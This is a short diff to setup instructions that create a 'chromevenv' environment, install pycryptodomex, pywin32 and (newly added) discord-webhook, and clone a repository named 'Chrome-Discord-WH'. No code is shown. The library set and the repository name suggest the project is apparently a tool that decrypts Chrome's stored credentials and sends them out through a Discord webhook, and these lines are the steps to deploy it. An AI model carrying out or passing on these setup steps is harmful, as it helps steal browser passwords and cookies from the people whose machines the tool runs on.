@@ -11,14 +11,15 @@ cd admin-config
 python -m venv chromevenv
 
 # Navigate into the 'chromevenv' directory
-cd chromevenv
+cd chromevenv/Scripts
 
 # Activate the virtual environment
-.\Scripts\Activate.bat
+./Activate.ps1
 
 # Install required Python libraries
 pip install pycryptodomex
 pip install pywin32
+pip install discord-webhook
 
 # Clone the GitHub repository
 git clone https://github.com/ishan211/Chrome-Discord-WH.git
